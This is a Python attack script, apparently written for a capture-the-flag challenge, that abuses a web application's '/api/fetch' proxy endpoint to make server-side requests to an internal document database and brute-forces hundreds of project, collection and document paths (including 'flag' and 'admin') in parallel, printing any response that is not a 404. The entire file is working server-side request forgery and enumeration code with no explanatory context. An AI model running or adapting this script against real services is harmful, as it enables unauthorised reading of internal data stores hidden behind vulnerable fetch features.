import urllib.request, urllib.error, json, concurrent.futures
BASE='https://<host>/fireburned-2'
STORE='http://fireburned--db:8080'
def fetch(path):
    data=json.dumps({'url':STORE+path}).encode()
    r=urllib.request.Request(BASE+'/api/fetch',data=data,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},method='POST')
    try:
        resp=urllib.request.urlopen(r,timeout=15); b=resp.read(); j=json.loads(b)
        return (j.get('upstream_status'), j.get('body'))
    except urllib.error.HTTPError as e:
        return ('HTTP'+str(e.code), e.read()[:200].decode('latin1','replace'))
    except Exception as e:
        return ('ERR',str(e)[:100])
projects=['emberhook-cards','emberhook','emberhook_cards','emberhookcards','fireburned','fireburned-2','fireburned2','default','demo','demo-project','demo-project-id','anci','hackrocks','ember','cards','ctf','test','project','app']
dbs=['(default)','default']
cols=['cards','drafts','documents','notifications','templates','card','draft','emberhook-cards','items','data']
docs=['','1','2','welcome','default','demo','flag','admin','test','sample','card1','draft1']
paths=[]
for p in projects:
    for col in cols:
        paths.append('/v1/projects/%s/databases/(default)/documents/%s'%(p,col))
        for d in docs:
            if d: paths.append('/v1/projects/%s/databases/(default)/documents/%s/%s'%(p,col,d))
    paths.append('/v1/projects/%s/databases/(default)/documents'%p)
    paths.append('/projects/%s/databases/(default)/documents'%p)
    paths.append('/%s/databases/(default)/documents'%p)
paths=list(dict.fromkeys(paths))
print('testing',len(paths))
def check(u):
    st,b=fetch(u)
    if st not in (404,):
        return (u,st,b)
    return None
with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
    for r in ex.map(check,paths):
        if r: print('HIT',r[0],r[1],str(r[2])[:300])
print('done')
